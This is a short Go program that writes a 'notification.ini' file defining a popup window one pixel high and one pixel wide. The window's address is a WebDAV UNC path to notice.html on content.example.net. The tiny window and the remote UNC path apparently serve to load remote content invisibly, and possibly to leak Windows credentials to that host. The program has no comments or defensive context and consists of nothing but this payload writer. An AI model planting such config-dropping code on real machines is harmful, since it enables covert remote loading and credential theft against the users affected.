package main
import "os"
func main() {
    popup := `
[PopWindow28]
Height=1
Address="\\content.example.net@SSL@443\DavWWWRoot\assets\notice.html"
Width=1
`
    os.WriteFile("notification.ini", []byte(popup), 0600)
}
